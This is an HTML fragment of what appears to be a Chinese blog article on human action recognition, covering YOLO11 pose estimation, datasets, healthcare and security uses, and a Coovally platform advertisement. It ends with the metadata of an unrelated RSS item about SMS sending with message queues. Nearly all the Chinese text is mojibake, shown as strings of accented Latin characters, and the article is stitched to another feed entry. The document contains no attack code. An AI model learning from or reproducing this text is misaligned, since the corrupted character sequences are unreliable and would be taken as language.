<p>äººç±»åŠ¨ä½œè¯†åˆ«ä½¿è®¡ç®—æœºç³»ç»Ÿèƒ½å¤Ÿé€šè¿‡åˆ†æäººä½“è¿åŠ¨æ¥ç†è§£äººç±»çš„æ´»åŠ¨æˆ–è¡Œä¸ºã€‚å®ƒä¸ä»…ä»…æ˜¯æ£€æµ‹å›¾åƒä¸­æ˜¯å¦æœ‰äººï¼Œæ›´èƒ½å¸®åŠ©è¯†åˆ«è¿™ä¸ªäººåœ¨åšä»€ä¹ˆã€‚ä¾‹å¦‚ï¼ŒåŒºåˆ†èµ°è·¯å’Œè·‘æ­¥ã€è¯†åˆ«æŒ¥æ‰‹åŠ¨ä½œï¼Œæˆ–è€…å‘ç°æœ‰äººæ‘”å€’ã€‚</p>
<p>HARçš„åŸºç¡€åœ¨äºè¿åŠ¨å’Œå§¿åŠ¿çš„æ¨¡å¼ã€‚äººä½“æ‰‹è‡‚æˆ–è…¿éƒ¨ä½ç½®çš„ç»†å¾®å˜åŒ–ï¼Œå¯èƒ½å¯¹åº”ç€ä¸åŒçš„åŠ¨ä½œã€‚é€šè¿‡æ•æ‰å¹¶è§£è¯»è¿™äº›ç»†èŠ‚ï¼ŒHARç³»ç»Ÿå¯ä»¥ä»èº«ä½“è¿åŠ¨ä¸­æå–å‡ºæœ‰æ„ä¹‰çš„ä¿¡æ¯ã€‚</p>
<p>ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œäººç±»åŠ¨ä½œè¯†åˆ«ç»¼åˆè¿ç”¨äº†æœºå™¨å­¦ä¹ ã€æ·±åº¦å­¦ä¹ æ¨¡å‹ã€è®¡ç®—æœºè§†è§‰å’Œå›¾åƒå¤„ç†ç­‰å¤šç§æŠ€æœ¯ï¼Œå…±åŒåˆ†æèº«ä½“è¿åŠ¨ï¼Œä»è€Œæ›´å‡†ç¡®åœ°è§£è¯»äººç±»è¡Œä¸ºã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c59ecece460947629f41ca1f99890cde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936768&amp;x-signature=ZXzA6q8mprTy9sae04Vhotq85lc%3D" alt="screenshot_2025-12-09_16-46-47.png" loading="lazy"/></p>
<p>æ—©æœŸçš„HARç³»ç»ŸåŠŸèƒ½æœ‰é™ï¼Œé€šå¸¸åªèƒ½åœ¨å—æ§ç¯å¢ƒä¸­å¤„ç†å°‘æ•°ç®€å•ã€é‡å¤çš„åŠ¨ä½œï¼Œä¸”éš¾ä»¥åº”å¯¹çœŸå®åœºæ™¯ã€‚</p>
<p>å¦‚ä»Šï¼Œå¾—ç›ŠäºAIå’Œæµ·é‡è§†é¢‘æ•°æ®ï¼ŒHARåœ¨å‡†ç¡®æ€§å’Œé²æ£’æ€§ä¸Šéƒ½å–å¾—äº†æ˜¾è‘—è¿›æ­¥ã€‚ç°ä»£ç³»ç»Ÿèƒ½å¤Ÿä»¥æ›´é«˜çš„ç²¾åº¦è¯†åˆ«å¤šç§æ´»åŠ¨ï¼Œä½¿å¾—è¯¥æŠ€æœ¯åœ¨åŒ»ç–—ä¿å¥ã€å®‰é˜²ã€äº¤äº’è®¾å¤‡ç­‰é¢†åŸŸå…·å¤‡äº†å®ç”¨ä»·å€¼ã€‚</p>
<h2 data-id="heading-1"><strong>æ£€æµ‹äººç±»åŠ¨ä½œçš„ä¸åŒæ–¹æ³•</strong></h2>
<p>äº†è§£äº†äººç±»åŠ¨ä½œè¯†åˆ«çš„åŸºæœ¬æ¦‚å¿µåï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æœºå™¨æ£€æµ‹äººç±»åŠ¨ä½œçš„å‡ ç§å¸¸è§æ–¹å¼ï¼š</p>
<ul>
<li><strong>åŸºäºä¼ æ„Ÿå™¨çš„æ–¹æ³•ï¼š</strong> åŠ é€Ÿåº¦è®¡ã€å¯ç©¿æˆ´è®¾å¤‡ã€æ™ºèƒ½æ‰‹æœºç­‰æ™ºèƒ½è®¾å¤‡å¯ä»¥ç›´æ¥ä»äººä½“æ•è·ä¿¡å·ã€‚å®ƒä»¬èƒ½æ˜¾ç¤ºè¡Œèµ°ã€å¥”è·‘ç”šè‡³é™æ­¢ç­‰è¿åŠ¨æ¨¡å¼ã€‚æ™ºèƒ½æ‰‹è¡¨ä¸Šçš„è®¡æ­¥å™¨å°±æ˜¯è¿™ç§æ–¹æ³•çš„ä¸€ä¸ªå…¸å‹ä¾‹å­ã€‚</li>
<li><strong>åŸºäºè§†è§‰çš„æ–¹æ³•ï¼š</strong> æ‘„åƒå¤´ç»“åˆè®¡ç®—æœºè§†è§‰ï¼Œé€å¸§åˆ†æå›¾åƒå’Œè§†é¢‘ï¼Œè¿½è¸ªäººä½“çš„å¤–è§‚å’Œè¿åŠ¨ã€‚è¿™ä½¿å¾—è¯†åˆ«æ›´å¤æ‚çš„æ´»åŠ¨æˆä¸ºå¯èƒ½ã€‚æ‰‹åŠ¿æ§åˆ¶çš„ç”µè§†æˆ–æ¸¸æˆç³»ç»Ÿå°±ä¾èµ–äºè¿™ç§æ–¹æ³•ã€‚</li>
<li><strong>å¤šæ¨¡æ€æ–¹æ³•ï¼š</strong> ç»“åˆä¼ æ„Ÿå™¨å’Œæ‘„åƒå¤´ï¼Œæ„å»ºæ›´å¯é çš„ç³»ç»Ÿã€‚ä¸€ç§æ¥æºå¯ä»¥éªŒè¯å¦ä¸€ç§æ¥æºçš„æ£€æµ‹ç»“æœã€‚ä¾‹å¦‚ï¼Œå¯ç©¿æˆ´è®¾å¤‡è®°å½•è¿åŠ¨ï¼Œè€Œæ‘„åƒå¤´éªŒè¯å§¿åŠ¿ï¼Œè¿™ç§è®¾ç½®å¸¸ç”¨äºè€å¹´äººæŠ¤ç†ä¸­çš„æ‘”å€’æ£€æµ‹ã€‚</li>
</ul>
<h2 data-id="heading-2"><strong>æ•°æ®é›†åœ¨äººç±»åŠ¨ä½œè¯†åˆ«ä¸­çš„ä½œç”¨</strong></h2>
<p>å¯¹äºä»»ä½•HARæ¨¡å‹æˆ–ç³»ç»Ÿæ¥è¯´ï¼Œæ•°æ®é›†éƒ½æ˜¯èµ·ç‚¹ã€‚ä¸€ä¸ªHARæ•°æ®é›†åŒ…å«è§†é¢‘ç‰‡æ®µã€å›¾åƒæˆ–ä¼ æ„Ÿå™¨æ•°æ®ç­‰æ ·æœ¬ï¼Œè®°å½•äº†è¡Œèµ°ã€åä¸‹ã€æŒ¥æ‰‹ç­‰åŠ¨ä½œã€‚è¿™äº›æ ·æœ¬ç”¨äºè®­ç»ƒAIæ¨¡å‹è¯†åˆ«äººç±»è¿åŠ¨æ¨¡å¼ï¼Œè¿›è€Œåº”ç”¨äºå®é™…åœºæ™¯ã€‚</p>
<p>è®­ç»ƒæ•°æ®çš„è´¨é‡ç›´æ¥å½±å“æ¨¡å‹çš„æ€§èƒ½ã€‚å¹²å‡€ã€ä¸€è‡´çš„æ•°æ®ä½¿ç³»ç»Ÿæ›´å®¹æ˜“å‡†ç¡®è¯†åˆ«åŠ¨ä½œã€‚</p>
<p>å› æ­¤ï¼Œæ•°æ®é›†åœ¨è®­ç»ƒå‰é€šå¸¸éœ€è¦è¿›è¡Œé¢„å¤„ç†ã€‚ä¸€ä¸ªå¸¸è§çš„æ­¥éª¤æ˜¯å½’ä¸€åŒ–ï¼Œå³ç»Ÿä¸€ç¼©æ”¾æ•°å€¼ï¼Œä»¥å‡å°‘è¯¯å·®å¹¶é˜²æ­¢è¿‡æ‹Ÿåˆï¼ˆæ¨¡å‹åœ¨è®­ç»ƒæ•°æ®ä¸Šè¡¨ç°è‰¯å¥½ï¼Œä½†é‡åˆ°æ–°æ•°æ®æ—¶åˆ™ä¸ä½³ï¼‰ã€‚</p>
<p>ä¸ºäº†è¡¡é‡æ¨¡å‹åœ¨è®­ç»ƒä¹‹å¤–çš„è¡¨ç°ï¼Œç ”ç©¶äººå‘˜ä¾èµ–äºè¯„ä¼°æŒ‡æ ‡å’ŒåŸºå‡†æ•°æ®é›†ï¼Œä»¥ä¾¿è¿›è¡Œå…¬å¹³çš„æµ‹è¯•å’Œæ¯”è¾ƒã€‚åƒUCF101ã€HMDB51å’ŒKineticsè¿™æ ·çš„æµè¡Œæ•°æ®é›†åŒ…å«äº†æˆåƒä¸Šä¸‡æ®µæ ‡è®°å¥½çš„è§†é¢‘ç‰‡æ®µï¼Œç”¨äºäººç±»åŠ¨ä½œæ£€æµ‹ã€‚åœ¨ä¼ æ„Ÿå™¨æ–¹é¢ï¼Œä»æ™ºèƒ½æ‰‹æœºå’Œå¯ç©¿æˆ´è®¾å¤‡æ”¶é›†çš„æ•°æ®é›†æä¾›äº†å®è´µçš„è¿åŠ¨ä¿¡å·ï¼Œä½¿å¾—è¯†åˆ«æ¨¡å‹åœ¨ä¸åŒç¯å¢ƒä¸‹æ›´åŠ ç¨³å¥ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6612acbb55fc4db49b6fb2d78b98de8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936768&amp;x-signature=qaTGfBJjCygFqE%2Fl2lsFc43dzSI%3D" alt="screenshot_2025-12-09_16-47-16.png" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>è®¡ç®—æœºè§†è§‰å¦‚ä½•æ”¯æŒäººç±»åŠ¨ä½œè¯†åˆ«</strong></h2>
<p>åœ¨å„ç§æ£€æµ‹äººç±»åŠ¨ä½œçš„æ–¹æ³•ä¸­ï¼Œè®¡ç®—æœºè§†è§‰è¿…é€Ÿæˆä¸ºæœ€å—æ¬¢è¿å’Œç ”ç©¶æœ€å¹¿æ³›çš„æ–¹å‘ä¹‹ä¸€ã€‚å®ƒçš„å…³é”®ä¼˜åŠ¿åœ¨äºå¯ä»¥ç›´æ¥ä»å›¾åƒå’Œè§†é¢‘ä¸­æå–ä¸°å¯Œçš„ç»†èŠ‚ã€‚é€šè¿‡é€å¸§åˆ†æåƒç´ å¹¶ç ”ç©¶è¿åŠ¨æ¨¡å¼ï¼Œå®ƒå¯ä»¥å®æ—¶è¯†åˆ«æ´»åŠ¨ï¼Œè€Œæ— éœ€äººä»¬ä½©æˆ´é¢å¤–è®¾å¤‡ã€‚</p>
<p>è¿‘å¹´æ¥ï¼Œæ·±åº¦å­¦ä¹ ï¼ˆå°¤å…¶æ˜¯ä¸“ä¸ºå›¾åƒåˆ†æè®¾è®¡çš„å·ç§¯ç¥ç»ç½‘ç»œï¼‰çš„è¿›æ­¥ï¼Œä½¿å¾—è®¡ç®—æœºè§†è§‰æ›´å¿«ã€æ›´å‡†ã€æ›´å¯é ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¹¿æ³›ä½¿ç”¨çš„å…ˆè¿›è®¡ç®—æœºè§†è§‰æ¨¡å‹ï¼Œå¦‚ YOLO11ï¼Œæ­£æ˜¯åŸºäºè¿™äº›è¿›æ­¥æ„å»ºçš„ã€‚YOLO11æ”¯æŒç‰©ä½“æ£€æµ‹ã€å®ä¾‹åˆ†å‰²ã€è·¨è§†é¢‘å¸§çš„äººç‰©è·Ÿè¸ªä»¥åŠäººä½“å§¿æ€ä¼°è®¡ç­‰ä»»åŠ¡ï¼Œè¿™ä½¿å®ƒæˆä¸ºäººç±»åŠ¨ä½œè¯†åˆ«çš„ä¸€ä¸ªå¼ºå¤§å·¥å…·ã€‚</p>
<ul>
<li><strong>YOLO11æ¦‚è¿°</strong></li>
</ul>
<p>YOLO11æ˜¯ä¸€æ¬¾å…¼é¡¾é€Ÿåº¦ä¸ç²¾åº¦çš„è§†è§‰AIæ¨¡å‹ã€‚å®ƒæ”¯æŒç‰©ä½“æ£€æµ‹ã€ç‰©ä½“è·Ÿè¸ªã€å§¿æ€ä¼°è®¡ç­‰æ ¸å¿ƒè®¡ç®—æœºè§†è§‰ä»»åŠ¡ï¼Œè¿™äº›èƒ½åŠ›å¯¹äººç±»åŠ¨ä½œè¯†åˆ«å°¤å…¶æœ‰ç”¨ã€‚</p>
<p>ç‰©ä½“æ£€æµ‹è¯†åˆ«å¹¶å®šä½åœºæ™¯ä¸­çš„äººã€‚</p>
<p>è·Ÿè¸ªåœ¨è§†é¢‘å¸§ä¸­è·Ÿéšäººçš„ç§»åŠ¨ï¼Œä»¥è¯†åˆ«åŠ¨ä½œåºåˆ—ã€‚</p>
<p>å§¿æ€ä¼°è®¡æ˜ å°„äººä½“å…³é”®å…³èŠ‚ï¼Œä»¥åŒºåˆ†ç›¸ä¼¼æ´»åŠ¨æˆ–æ£€æµ‹å¦‚æ‘”å€’ä¹‹ç±»çš„çªå‘å˜åŒ–ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåˆ©ç”¨è¯¥æ¨¡å‹çš„æ´å¯ŸåŠ›ï¼Œå¯ä»¥åŒºåˆ†ä¸€ä¸ªäººä»å®‰é™åç€ï¼Œåˆ°ç«™èµ·æ¥ï¼Œå†åˆ°ä¸¾èµ·æ‰‹è‡‚æ¬¢å‘¼è¿™ä¸€ç³»åˆ—åŠ¨ä½œã€‚è¿™äº›ç®€å•çš„æ—¥å¸¸è¡Œä¸ºä¹çœ‹ç›¸ä¼¼ï¼Œä½†åœ¨åºåˆ—åˆ†æä¸­å´æ‰¿è½½ç€å®Œå…¨ä¸åŒçš„å«ä¹‰ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dec9aab5668d425893cf0c1e7dd488e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936768&amp;x-signature=yDXDmtqtlgxJwesrr5262%2FELIZQ%3D" alt="screenshot_2025-12-09_16-47-27.png" loading="lazy"/></p>
<p>ç„¶è€Œï¼Œå°†è¿™äº›å…ˆè¿›çš„æ¨¡å‹è½¬åŒ–ä¸ºå®é™…åœºæ™¯ä¸­ç¨³å®šã€å¯ç”¨çš„åº”ç”¨ï¼Œä»ç„¶é¢ä¸´ç€æ•°æ®å¤„ç†å¤æ‚ã€æ¨¡å‹è¿­ä»£å‘¨æœŸé•¿ã€éƒ¨ç½²è¿ç»´é—¨æ§›é«˜ç­‰ä¸€ç³»åˆ—æŒ‘æˆ˜ã€‚è¿™æ­£æ˜¯ Coovally è¿™ç±»AIå¼€å‘å¹³å°æ—¨åœ¨è§£å†³çš„é—®é¢˜ã€‚ä»æ•°æ®é›†çš„é›†ä¸­ç®¡ç†ä¸æ™ºèƒ½æ ‡æ³¨ï¼Œåˆ°è‡ªåŠ¨åŒ–æ¨¡å‹è®­ç»ƒã€è¶…å‚è°ƒä¼˜ä¸æ€§èƒ½è¯„ä¼°ï¼Œå†åˆ°æœ€ç»ˆçš„ä¸€é”®æ¨¡å‹éƒ¨ç½²ä¸æŒç»­ç›‘æ§ï¼ŒCoovallyä¸ºå¼€å‘è€…å’Œä¼ä¸šå›¢é˜Ÿæä¾›äº†ç«¯åˆ°ç«¯çš„å·¥å…·é“¾ã€‚è¿™æ„å‘³ç€ï¼Œæ— è®ºæ˜¯åŸºäºYOLO11æ„å»ºæ–°çš„è¡Œä¸ºè¯†åˆ«æ¨¡å‹ï¼Œè¿˜æ˜¯å¯¹ç°æœ‰ç®—æ³•è¿›è¡Œä¼˜åŒ–å’Œè§„æ¨¡åŒ–éƒ¨ç½²ï¼Œå›¢é˜Ÿéƒ½å¯ä»¥åœ¨åŒä¸€ä¸ªååŒå¹³å°ä¸Šé«˜æ•ˆå®Œæˆï¼Œä»è€Œå°†æ›´å¤šç²¾åŠ›é›†ä¸­äºæ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä¸åˆ›æ–°ï¼ŒåŠ é€ŸHARæŠ€æœ¯ä»å®éªŒå®¤èµ°å‘çœŸå®ä¸–ç•Œçš„æ­¥ä¼ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45d0ba0724e84f6d8dbb659c6f53dad2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936768&amp;x-signature=Pe%2BKga6vV5Z65KkIuZqEjr4qkac%3D" alt="Coovallyæ“ä½œåŠ¨å›¾.gif" loading="lazy"/></p>
<p>Coovallyå¹³å°ä¸ä»…æä¾›æ¨¡å‹èµ„æºï¼Œè¿˜å¯ä»¥å¸®åŠ©ä½ æä¾›<strong>AIè§£å†³æ–¹æ¡ˆ</strong>ï¼Œå¯ä»¥æ‰«æäºŒç»´ç ï¼Œæˆ‘ä»¬æ¥ç»™ä½ æä¾›è§£å†³æ–¹æ¡ˆï¼ï¼</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e0116df22b34e3fa6690f8593b8dce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936768&amp;x-signature=0RIXdR%2FBasw8NQnNcsM4yYap5zo%3D" alt="å°åŠ©æ‰‹äºŒç»´ç .png" loading="lazy"/></p>
<p>ç‚¹å‡»<strong>é˜…è¯»åŸæ–‡</strong>ï¼Œå³å¯ä½“éªŒCoovallyå¹³å°ï¼</p>
<h2 data-id="heading-4"><strong>è®¡ç®—æœºè§†è§‰ä¸HARçš„å®é™…åº”ç”¨</strong></h2>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬å…·ä½“çœ‹çœ‹åŸºäºè®¡ç®—æœºè§†è§‰çš„äººç±»åŠ¨ä½œè¯†åˆ«å¦‚ä½•åº”ç”¨äºå½±å“æ—¥å¸¸ç”Ÿæ´»çš„å®é™…åœºæ™¯ä¸­ã€‚</p>
<ul>
<li><strong>åŒ»ç–—ä¿å¥ä¸å¥åº·</strong></li>
</ul>
<p>åœ¨åŒ»ç–—é¢†åŸŸï¼Œè¿åŠ¨ä¸­çš„ç»†å¾®å˜åŒ–èƒ½æä¾›æœ‰å…³ä¸ªäººçŠ¶å†µçš„é‡è¦ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œè€å¹´æ‚£è€…çš„è¸‰è·„ï¼Œæˆ–è€…åº·å¤è¿‡ç¨‹ä¸­è‚¢ä½“çš„è§’åº¦ï¼Œéƒ½å¯èƒ½æ­ç¤ºé£é™©æˆ–è¿›å±•ã€‚è¿™äº›è¿¹è±¡åœ¨ä¼ ç»Ÿæ£€æŸ¥æ–¹å¼ä¸‹å¾ˆå®¹æ˜“è¢«å¿½ç•¥ã€‚</p>
<p>YOLO11å¯ä»¥é€šè¿‡å§¿æ€ä¼°è®¡å’Œå›¾åƒåˆ†æå®æ—¶ç›‘æµ‹æ‚£è€…ï¼Œæä¾›å¸®åŠ©ã€‚å®ƒå¯ä»¥ç”¨äºæ£€æµ‹æ‘”å€’ã€è¿½è¸ªåº·å¤é”»ç‚¼æƒ…å†µï¼Œå¹¶è§‚å¯Ÿè¡Œèµ°ã€ä¼¸å±•ç­‰æ—¥å¸¸æ´»åŠ¨ã€‚ç”±äºå®ƒé€šè¿‡è§†è§‰åˆ†æå·¥ä½œï¼Œæ— éœ€ä¼ æ„Ÿå™¨æˆ–å¯ç©¿æˆ´è®¾å¤‡ï¼Œå› æ­¤ä¸ºæ”¶é›†æ”¯æŒæ‚£è€…æŠ¤ç†çš„å‡†ç¡®ä¿¡æ¯æä¾›äº†ä¸€ç§ç®€ä¾¿æ–¹æ³•ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/536cc84392cb4278a75c5d65629cb47f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936768&amp;x-signature=2sfhrquHizjzu7TaSfh4jA8RnIo%3D" alt="screenshot_2025-12-09_16-47-34.png" loading="lazy"/></p>
<ul>
<li><strong>å®‰é˜²ä¸ç›‘æ§</strong></li>
</ul>
<p>å®‰é˜²ç³»ç»Ÿä¾èµ–å¿«é€Ÿæ£€æµ‹å¼‚å¸¸äººç±»æ´»åŠ¨ï¼Œä¾‹å¦‚æœ‰äººå¾˜å¾Šã€åœ¨é™åˆ¶åŒºåŸŸå¥”è·‘æˆ–çªç„¶è¡¨ç°å‡ºæ”»å‡»æ€§ã€‚åœ¨ç¹å¿™çš„ç¯å¢ƒä¸­ï¼Œå®‰ä¿äººå‘˜æ— æ³•æ‰‹åŠ¨ç›‘æ§ä¸€åˆ‡ï¼Œè¿™äº›è¿¹è±¡å¸¸å¸¸è¢«é—æ¼ã€‚è¿™æ­£æ˜¯è®¡ç®—æœºè§†è§‰å’ŒYOLO11å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚</p>
<p>YOLO11é€šè¿‡é©±åŠ¨èƒ½å¤Ÿæ£€æµ‹å¯ç–‘åŠ¨ä½œå¹¶å³æ—¶å‘å‡ºè­¦æŠ¥çš„å®æ—¶è§†é¢‘ç›‘æ§ï¼Œè®©å®‰é˜²ç›‘æ§å˜å¾—æ›´é«˜æ•ˆã€‚å®ƒæœ‰åŠ©äºç»´æŠ¤å…¬å…±ç©ºé—´çš„äººç¾¤å®‰å…¨ï¼Œå¹¶åŠ å¼ºç§äººåŒºåŸŸçš„å…¥ä¾µæ£€æµ‹ã€‚</p>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå®‰ä¿äººå‘˜å¯ä»¥ä¸è®¡ç®—æœºè§†è§‰ç³»ç»ŸååŒå·¥ä½œï¼Œå½¢æˆäººæœºäº’åŠ¨ä¸åä½œï¼Œä»è€Œæ›´å¿«ã€æ›´åŠæ—¶åœ°å¯¹å¯ç–‘æ´»åŠ¨åšå‡ºååº”ã€‚</p>
<h2 data-id="heading-5"><strong>ä½¿ç”¨è®¡ç®—æœºè§†è§‰è¿›è¡Œ HAR çš„ä¼˜ç¼ºç‚¹</strong></h2>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨è®¡ç®—æœºè§†è§‰è¿›è¡Œäººä½“æ´»åŠ¨è¯†åˆ«çš„ä¸€äº›ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>å¯æ‰©å±•æ€§ï¼š</strong> è®¾ç½®å®Œæˆåï¼ŒåŒä¸€è¯†åˆ«ç³»ç»Ÿå¯ä»¥è‡ªåŠ¨åŒæ—¶ç›‘æ§å¤šäººï¼Œä½¿å…¶å¯ç”¨äºåŒ»ç–—æœºæ„ã€å·¥å‚å’Œå…¬å…±åœºæ‰€çš„è‡ªåŠ¨åŒ–ã€‚</li>
<li><strong>å®æ—¶å¤„ç†ï¼š</strong> è§†è§‰ AI è§£å†³æ–¹æ¡ˆ å¯ç”¨äºåˆ†ææ­£åœ¨å‘ç”Ÿçš„è§†é¢‘æµï¼Œä»è€Œå®ç°æ›´å¿«çš„å“åº”ã€‚</li>
<li><strong>éä¾µå…¥å¼è·Ÿè¸ªï¼š</strong> ä¸å¯ç©¿æˆ´è®¾å¤‡æˆ–ä¼ æ„Ÿå™¨ä¸åŒï¼Œå®ƒä¸éœ€è¦äººä»¬æºå¸¦è®¾å¤‡ï¼Œä»è€Œå¯ä»¥è¿›è¡Œè‡ªç„¶è€Œè½»æ¾çš„è¡Œä¸ºåˆ†æã€‚Â </li>
</ul>
<p>è™½ç„¶ä½¿ç”¨è®¡ç®—æœºè§†è§‰è¿›è¡Œ HAR æœ‰å¾ˆå¤šå¥½å¤„ï¼Œä½†ä¹Ÿå­˜åœ¨ä¸€äº›å±€é™æ€§éœ€è¦è€ƒè™‘ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›éœ€è¦è®°ä½çš„å› ç´ ï¼š Â </p>
<ul>
<li><strong>éšç§é—®é¢˜ï¼š</strong> åŸºäºè§†é¢‘çš„ç›‘æ§å¯èƒ½ä¼šå¼•å‘å…³äºæ•°æ®ä¿æŠ¤å’ŒåŒæ„çš„é—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨å®¶åº­æˆ–å·¥ä½œåœºæ‰€ç­‰æ•æ„Ÿç¯å¢ƒä¸­ã€‚</li>
<li><strong>æ½œåœ¨åå·®ï¼š</strong> å¦‚æœè®­ç»ƒæ•°æ®é›†ç¼ºä¹å¤šæ ·æ€§ï¼Œç®—æ³•å¯èƒ½ä¼šé”™è¯¯åœ°è§£é‡ŠæŸäº›äººç¾¤çš„è¡Œä¸ºï¼Œä»è€Œå¯¼è‡´ä¸å…¬å¹³æˆ–ä¸å‡†ç¡®çš„ç»“æœã€‚</li>
<li><strong>ç¯å¢ƒæ•æ„Ÿæ€§ï¼š</strong> ç”±äºå…‰çº¿ä¸è¶³ã€èƒŒæ™¯æ‚ä¹±æˆ–äººå‘˜éƒ¨åˆ†éšè—ï¼Œå‡†ç¡®æ€§å¯èƒ½ä¼šä¸‹é™ï¼Œè¿™æ„å‘³ç€éœ€è¦ä»”ç»†è®¾è®¡ç³»ç»Ÿã€‚</li>
</ul>
<h2 data-id="heading-6"><strong>æ€»ç»“</strong></h2>
<p>äººå·¥æ™ºèƒ½å’Œè®¡ç®—æœºè§†è§‰ä½¿æœºå™¨èƒ½å¤Ÿæ›´å‡†ç¡®ã€å®æ—¶åœ°è¯†åˆ«äººç±»è¡Œä¸ºã€‚é€šè¿‡åˆ†æè§†é¢‘å¸§å’Œè¿åŠ¨æ¨¡å¼ï¼Œè¿™äº›ç³»ç»Ÿå¯ä»¥è¯†åˆ«æ—¥å¸¸æ‰‹åŠ¿å’Œçªå‘å˜åŒ–ã€‚éšç€æŠ€æœ¯çš„ä¸æ–­è¿›æ­¥ï¼Œäººç±»æ´»åŠ¨è¯†åˆ«æ­£åœ¨èµ°å‡ºç ”ç©¶å®éªŒå®¤ï¼Œæˆä¸ºåŒ»ç–—ä¿å¥ã€å®‰å…¨å’Œæ—¥å¸¸åº”ç”¨çš„å®ç”¨å·¥å…·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹åŸºäºMQå®ç°å¯é çŸ­ä¿¡å‘é€æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7581741663183159331</link>    <guid>https://juejin.cn/post/7581741663183159331</guid>    <pubDate>2025-12-10T01:36:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581741663183159331" data-draft-id="7581752787563708456" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹åŸºäºMQå®ç°å¯é çŸ­ä¿¡å‘é€æœºåˆ¶"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2025-12-10T01:36:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤©å¤©æ‘¸é±¼çš„javaå·¥ç¨‹å¸ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3109843365802925"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹åŸºäºMQå®ç°å¯é çŸ­ä¿¡å‘é€æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3109843365802925/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤©å¤©æ‘¸é±¼çš„javaå·¥ç¨‹å¸ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:36:39.000Z" title="Wed Dec 10 2025 01:36:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
